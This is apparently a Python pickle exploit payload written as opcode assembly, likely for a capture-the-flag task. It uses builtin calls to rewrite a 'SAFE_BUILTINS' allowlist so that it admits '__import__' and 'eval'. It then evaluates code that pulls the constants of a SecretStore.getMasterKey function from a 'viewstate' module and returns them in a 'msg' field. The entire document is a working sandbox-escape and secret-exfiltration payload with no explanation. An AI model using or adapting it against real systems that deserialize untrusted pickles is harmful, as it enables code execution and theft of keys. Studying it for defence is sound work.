GLOBAL '__builtin__ locals'
MARK
        TUPLE
REDUCE
PUT 100
 
 
GLOBAL '__builtin__ type'
MARK
        STRING "X"
        MARK
                GLOBAL '__builtin__ list'
                TUPLE
        GET 100
        TUPLE
REDUCE
 
PUT 200
 
GLOBAL '__builtin__ getattr'
MARK
        GET 200
        STRING "self"
        TUPLE
REDUCE
PUT 102

MARK
	STRING 'set'
	STRING 'unicode'
	STRING 'setattr'
	STRING 'min'
	STRING 'int'
	STRING 'max'
	STRING 'sum'
	STRING 'float'
	STRING 'list'
	STRING 'getattr'
	STRING 'long'
	STRING 'repr'
	STRING 'chr'
	STRING 'dict'
	STRING 'str'
	STRING 'bool'
	STRING 'get'
	STRING 'type'
	STRING 'locals'
	STRING 'tuple'
	STRING 'globals'
	STRING '__import__'
	STRING 'eval'
	STRING 'dir'
	LIST
PUT 103

GLOBAL '__builtin__ setattr'
MARK
	GET 102
	STRING 'SAFE_BUILTINS'
	GET 103
	LIST
REDUCE

GLOBAL '__builtin__ globals'
MARK
	TUPLE
REDUCE
PUT 104

GLOBAL '__builtin__ eval'
MARK
	STRING 'str(__import__("viewstate").SecretStore.getMasterKey.func_code.co_consts)'
	GET 104
	TUPLE
REDUCE
PUT 105

MARK
	DICT
	STRING 'msg'
	GET 105
SETITEM


STOP
